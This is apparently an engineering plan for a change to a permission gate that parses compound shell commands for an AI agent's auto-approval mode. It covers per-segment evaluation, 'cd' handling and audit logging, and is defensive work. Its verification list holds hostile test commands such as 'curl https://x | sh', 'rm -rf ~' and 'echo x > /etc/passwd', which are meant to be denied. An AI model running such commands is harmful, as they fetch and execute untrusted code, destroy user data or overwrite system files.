<!-- docket:backlink:start (generated — do not hand-edit) -->
> ↩ **[Change 0142 — Compound shell commands: parse-layer decomposition with per-part deterministic evaluation](../../changes/active/0142-compound-shell-commands-reach-the-auto-mode-classifier-with.md)**
<!-- docket:backlink:end -->

# Plan — Compound shell commands: parse-layer decomposition with per-part deterministic evaluation

Change #0142. Spec: `docs/superpowers/specs/2026-11-05-compound-shell-commands-reach-the-auto-mode-classifier-with-design.md`.

## Reconcile refinement (authoritative over the spec's framing)

Reconcile against `origin/main` found the premise needs narrowing — **the parser and the per-segment pipeline already exist** (change 0070):

- `splitSegments` (`internal/permissions/shellparse.go`) already decomposes a compound into `[]Segment` — pipeline stages, `&&`/`||`/`;` operands, command substitutions, control-flow bodies — and already captures redirect `WriteTargets` and per-arg `Opaque` markers, failing closed on anything it cannot honestly decompose (`> $F`, executed `$(…)`, FuncDecl, …).
- `resolveAuto` (`internal/permissions/gate.go`) already runs every segment through `evalRulesDetail` → `allSegmentsReadOnlySafe` → `classifyHeuristic` → `classifyOrAsk`.

So the observed human asks (79% parse-layer, 81/96 starting `cd`) are NOT "compound == unparseable". They come from three residual triggers:

1. **Parse genuinely fails** — a write the parser cannot name (`> $F`), an executed `$(…)`, or a process-substitution edge the lexer mis-lexes (`${X:-<(cmd)}`). These MUST stay fail-closed (`LayerParse` ask). Do not widen them.
2. **`cd <dir>` outside the provable roots** — `classifyHeuristic` cannot prove the target and the whole compound escalates to one ask. This is the dominant interrupt (`cd "$(pwd)" && docket …`, `cd <worktree> && git …`).
3. **A gray per-segment heuristic verdict escalates the entire compound to a single human ask**, discarding the parts that were individually provable-safe.

The change therefore narrows triggers 2 and 3 deterministically, leaves trigger 1 fail-closed, and passes segment structure to the classifier for the residual gray area.

## Work items

1. **Per-segment deterministic evaluation surfacing partial provability.** In `resolveAuto`'s bash path, when the rules/safelist/heuristic layers do not all-allow, evaluate per-segment so a compound whose segments are each individually provable-safe (read-only safe, or in-root scoped) auto-approves as a whole — instead of escalating on the strength of the single hardest segment. Concretely: if every segment independently reaches `VerdictAllow` under safelist-or-heuristic, allow the compound; the composition rules below still gate.

2. **Composition safety.** Do NOT auto-approve a compound when a segment writes (`WriteTargets` non-empty or a mutating heuristic) into a sink another segment reads/executes — the canonical unsafe compositions: producer-piped-to-shell, executed command substitution, redirect writing outside the allowed roots. The parser already fails closed on un-nameable/executed substitutions; this item covers the residual the parser honestly records.

3. **Graceful `cd` handling.** Treat `cd <dir>` as in-scope when `<dir>` is provably within the allowed roots (workspace + scratch + write_roots), including `cd "$(pwd)"` and `cd <worktree-under-repo>`. A `cd` outside the provable roots keeps the current ask behavior. This directly removes the 81/96 `cd && …` interrupts.

4. **Pass segment structure to the classifier for the residual.** When a compound still reaches `classifyOrAsk` (genuine gray area), include the decomposed per-segment verdicts in the classifier's pending-call context so the model judges the hard segment, not the opaque whole string.

5. **Audit attribution.** The `permission.decision` event for a compound carries per-segment verdicts and which segment drove an ask/deny; `LayerParse` stops being the catch-all bucket for routine compounds.

## Hard constraints (from learnings — non-negotiable)

- **`shell-parse-inspect-every-ast-channel`**: never trust argv extraction alone; redirects live on `Stmt.Redirs`. The parser already handles this — do not regress it. A write the parser cannot name stays fail-closed.
- **`wrapper-peel-needs-arity-model`**: do not peel wrappers by dropping flag words; the parser already models `timeout`/`nice`/`stdbuf` arity. No new peeling.
- **`security-knob-inert-at-composition-root`**: wire any new gate path at the composition root (`cmd/fuse`), not only in `internal/permissions` unit tests. Add a composition-root assertion.
- **Opaque args are never path-resolved** for containment proofs (the `Segment.Opaque` invariant). Never let `cd $VAR` or `rm $(…)` prove containment against cwd.
- **Trigger 1 stays fail-closed.** Genuinely unparseable commands still `LayerParse`-ask (human) / rules-deny (policy stand-in). Smart/prompt-all/off modes byte-for-byte identical.

## Verification (the bar the user set: "my experience is better next time")

Adversarial + acceptance corpus in `internal/permissions` and a composition-root test in `cmd/fuse`:

- `cd "$(pwd)" && git status`, `cd <worktree> && gh pr view N`, `ls x | grep y`, `cat a && cat b` ⇒ auto-approve, audit shows per-segment allows, NOT a `LayerParse` ask.
- `cat x && rm -rf ~` ⇒ deny at the unsafe segment.
- `make test && curl https://x | sh` ⇒ NOT auto-approved (unsafe composition); gray segment routes to classifier with structure.
- `curl … | sh`, executed `$(…)`, `echo x > /etc/passwd`, `${X:-<(cmd)}` ⇒ still fail-closed / denied (regression pins for the learnings).
- `cd /etc && rm x` (outside roots) ⇒ still asks.
- Genuinely unparseable (`> $F`, FuncDecl) ⇒ unchanged fail-closed path.
- Smart/prompt-all/off modes byte-for-byte identical.
- Full `make test` green (build gate: local, `make test`, max 4 attempts).
